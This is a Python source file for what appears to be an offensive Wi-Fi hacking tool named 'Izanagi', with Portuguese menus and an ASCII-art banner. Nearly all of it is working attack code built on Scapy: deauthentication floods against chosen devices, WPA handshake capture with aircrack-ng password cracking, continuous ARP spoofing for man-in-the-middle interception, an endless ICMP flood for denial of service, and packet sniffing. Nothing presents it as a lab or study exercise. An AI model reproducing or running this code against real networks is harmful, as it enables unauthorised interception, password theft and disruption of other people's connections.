import os
import time
from scapy.all import *
from subprocess import Popen, PIPE
from colorama import Fore, Back, Style, init
import random
import threading

init(autoreset=True)

def show_banner():
    banner = f"""
     {Fore.GREEN}Izanagi - Hacking Wi-Fi Tool
     {Fore.YELLOW}By: Toth

    {Fore.CYAN}⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠂
⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀
⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⠀
⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡇⠀⠀
⠀⠀⠀⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡇⠀⠀
⠀⠀⠀⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⠃⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣄⣀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⣛⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣙⣭⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢈⢿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⢿⣿⣿⣿⣿⣿⣿⣿⡿⢣⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣦⣽⣛⣻⠿⠿⣟⣛⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣛⣛⣛⣛⣻⣭⣶⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⡏⢿⣿⣿⣿⡟⣼⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣿⡈⢿⣿⠟⢰⣿⢃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠹⣷⡀⠉⢠⣿⠏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣯⣍⡛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣿⣷⣶⣿⡟⠀⢿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⢋⣩⣵⣾⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣜⢿⣿⣿⣿⣿⣶⣶⣤⣤⣤⣉⣉⣉⣁⣀⣠⣴⣿⣿⣿⣿⣿⣤⣄⣀⣀⣀⣠⣤⣤⣴⣶⣾⣿⣿⣿⣿⡿⢋⣾⣿⣇⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣷⣮⡝⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⢩⣾⣿⣿⣿⡿⣄⠀⠀
⠀⠀⢰⡏⠘⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⢭⣭⣽⡟⠛⠛⠛⠋⢁⣿⣿⣿⣿⣷⡈⠉⠉⠉⠉⢭⣭⣭⠵⠀⠀⠀⠀⠀⣼⣿⣿⣿⠟⠀⣽⠀⠀
⠀⠀⠀⢿⣄⠀⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⡿⠃⢀⣾⡟⠀⠀
⠀⠀⠀⠘⣿⣷⣤⣈⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⣀⣤⣾⡿⢸⣿⣿⣿⡇⢿⣷⣤⣀⡀⠀⠀⠀⢀⣀⣤⣶⣿⡿⠟⣉⣤⣴⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣷⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣿⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⣶⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣿⡟⢈⣭⣟⣛⠿⠿⣿⣿⣿⠟⣩⣤⣬⣝⢿⣿⣿⣿⣿⣿⣿⣫⣥⣶⣌⠙⠿⡿⠿⠿⣛⣫⣭⣧⣄⢹⣿⣿⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣇⣿⣿⢛⣯⣟⢿⣶⣶⣶⡇⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⢸⣿⣾⣿⢟⣯⣭⣝⢻⣿⣼⣿⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⣵⣿⣿⣿⣷⢹⣿⣿⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⣿⡏⣾⣿⣿⣿⣧⡹⣿⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⡿⢋⣾⣿⣿⣿⣿⠟⢈⢿⣿⣿⣷⣤⣉⠙⠿⣿⣿⣿⣿⣿⠿⠛⣉⣤⣾⣿⣿⡿⡁⠙⢿⣿⣿⣿⣿⣌⠻⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣨⣶⣿⣿⡿⢟⠋⠀⠀⢸⡎⠻⣿⣿⣿⣿⣿⣶⣮⣭⣿⣯⣵⣶⣿⣿⣿⣿⡿⢟⠱⡇⠀⠀⠈⣙⡻⠿⣿⣿⣦⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠒⠛⠛⠉⣽⣶⣾⣿⣧⠀⠀⠈⠃⣿⣶⣶⢰⣮⡝⣛⣻⢿⣿⣿⢿⣛⡫⣵⣶⢲⣾⣿⠀⠃⠀⠀⣸⣿⣿⣿⣶⠂⠈⠉⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡄⠀⠀⠀⢿⡿⠁⠈⠛⠷⠿⠿⠿⠿⠿⠸⠿⠇⠛⠁⠀⢹⣿⠀⠀⠀⠀⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠘⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠏⠀⠀⠀⠀⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⣠⣶⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⢰⣦⢰⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡙⠇⣰⡇⢰⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣷⢠⣷⡜⢋⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣇⢿⠗⣿⣿⣷⡄⣴⣶⣴⡆⣶⡆⣶⣰⣶⡄⣾⣿⣿⡞⢿⣣⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⣧⡻⡿⢟⣣⣛⣣⠻⣃⡻⣣⣛⣣⣛⣡⣛⡻⡿⣱⣷⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣾⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣶⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣭⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣽⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠛⠋⠉⠁⠀⠀⠀⠀⠈⠉⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(banner)

def packet_callback_handshake(packet):
    if packet.haslayer(EAPOL):
        print(f"{Fore.CYAN}[✓] Handshake detectado!")
        with open("handshake.cap", "ab") as f:
            f.write(bytes(packet))

def deauth_attack(target_mac, ap_mac, iface):
    print(f"{Fore.RED}[-->] Enviando pacotes de desautenticação para {Fore.GREEN}{target_mac}...")
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
    sendp(packet, iface=iface, count=100, inter=0.1)

def sniff_wifi(interface):
    print(f"{Fore.GREEN}[=] Capturando pacotes na interface {interface}...")
    sniff(iface=interface, prn=packet_callback, store=0)

def wpa_attack(handshake_file, wordlist_file):
    print(f"{Fore.GREEN}[✓] Iniciando ataque WPA...")
    command = f"aircrack-ng {handshake_file} -w {wordlist_file}"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    output, error = process.communicate()
    print(output.decode())
    if "KEY FOUND!" in output.decode():
        print(f"{Fore.GREEN}[✓] Senha encontrada! A chave é: {output.decode().split(' ')[-1]}")
    else:
        print(f"{Fore.RED}[X] Senha não encontrada no dicionário.")

def arp_spoof(target_ip, gateway_ip, iface):
    print(f"{Fore.RED}[-->] Realizando ARP Spoofing para redirecionar tráfego de {Fore.GREEN}{target_ip} para {Fore.GREEN}{gateway_ip}...")
    while True:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), iface=iface, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), iface=iface, verbose=False)
        time.sleep(2)

def monitor_traffic(interface):
    print(f"{Fore.GREEN}[=] Iniciando monitoramento de tráfego na interface {interface}...")
    sniff(iface=interface, prn=lambda x: x.show(), store=0)

def packet_callback(packet):
    if packet.haslayer(Dot11):
        if packet.type == 0 and packet.subtype == 8:
            ssid = packet[Dot11Elt].info.decode()
            mac_address = packet[Dot11].addr2
            channel = int(ord(packet[Dot11Elt:3].info))
            encryption = "WPA/WPA2" if packet.haslayer(Dot11WEP) else "WEP" if packet.haslayer(Dot11WEP) else "Open"
            print(f"{Fore.GREEN}[-->] SSID: {Fore.CYAN}{ssid} | {Fore.YELLOW}MAC: {mac_address} | {Fore.BLUE}Canal: {channel} | {Fore.RED}Encriptação: {encryption}")
        
        if packet.haslayer(EAPOL):
            packet_callback_handshake(packet)

def scan_networks(interface):
    print(f"{Fore.GREEN}[=] Escaneando redes Wi-Fi disponíveis na interface {interface}...")
    networks = []
    sniff(iface=interface, timeout=10, prn=lambda packet: extract_network(packet, networks))
    return networks

def extract_network(packet, networks):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        ssid = packet[Dot11Elt].info.decode()
        mac_address = packet[Dot11].addr2
        if ssid not in networks:
            networks.append(ssid)
            print(f"{Fore.GREEN}[-->] Rede detectada: {Fore.CYAN}{ssid} ({mac_address})")

def dos_attack(target_ip, iface):
    print(f"{Fore.RED}[-->] Iniciando ataque de DoS contra {Fore.GREEN}{target_ip}...")
    while True:
        packet = IP(dst=target_ip)/ICMP()
        send(packet, iface=iface, verbose=False)
        time.sleep(0.1)

def check_connected_devices(interface):
    print(f"{Fore.GREEN}[=] Verificando dispositivos conectados à rede na interface {interface}...")
    devices = os.popen(f"sudo arp-scan --interface={interface} --localnet").read()
    print(devices)

def quick_action_choice():
    print(f"{Fore.YELLOW}[=] Escolha uma opção para execução rápida:")
    print(f"{Fore.CYAN}[1] Capturar pacotes e analisar redes Wi-Fi")
    print(f"{Fore.CYAN}[2] Ataque de Desautenticação")
    print(f"{Fore.CYAN}[3] Iniciar WPA Attack (forçar senha)")
    print(f"{Fore.CYAN}[4] ARP Spoofing (Man-in-the-Middle)")
    print(f"{Fore.CYAN}[5] Monitorar Tráfego")
    print(f"{Fore.CYAN}[6] Ataque DoS")
    print(f"{Fore.CYAN}[7] Verificar Dispositivos Conectados")
    print(f"{Fore.CYAN}[8] Sair")

    choice = input(f"{Fore.YELLOW}[-->] Escolha a opção desejada (1-8): ")
    return choice

def main_menu():
    show_banner()
    while True:
        choice = quick_action_choice()
        if choice == "1":
            interface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            sniff_wifi(interface)
        elif choice == "2":
            target_mac = input(f"{Fore.YELLOW}[-->] Digite o endereço MAC do dispositivo alvo: ")
            ap_mac = input(f"{Fore.YELLOW}[-->] Digite o endereço MAC do ponto de acesso: ")
            interface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            deauth_attack(target_mac, ap_mac, interface)
        elif choice == "3":
            handshake_file = input(f"{Fore.YELLOW}[-->] Digite o caminho para o arquivo de handshake (ex: handshake.cap): ")
            wordlist_file = input(f"{Fore.YELLOW}[-->] Digite o caminho para o dicionário de senhas (ex: wordlist.txt): ")
            wpa_attack(handshake_file, wordlist_file)
        elif choice == "4":
            target_ip = input(f"{Fore.YELLOW}[-->] Digite o IP do dispositivo alvo: ")
            gateway_ip = input(f"{Fore.YELLOW}[-->] Digite o IP do gateway: ")
            iface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            arp_spoof(target_ip, gateway_ip, iface)
        elif choice == "5":
            interface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            monitor_traffic(interface)
        elif choice == "6":
            target_ip = input(f"{Fore.YELLOW}[-->] Digite o IP do alvo: ")
            iface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            dos_attack(target_ip, iface)
        elif choice == "7":
            interface = input(f"{Fore.YELLOW}[-->] Digite a interface de rede (ex: wlan0): ")
            check_connected_devices(interface)
        elif choice == "8":
            print(f"{Fore.GREEN}[✓] Saindo...")
            exit()
        else:
            print(f"{Fore.RED}[X] Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main_menu()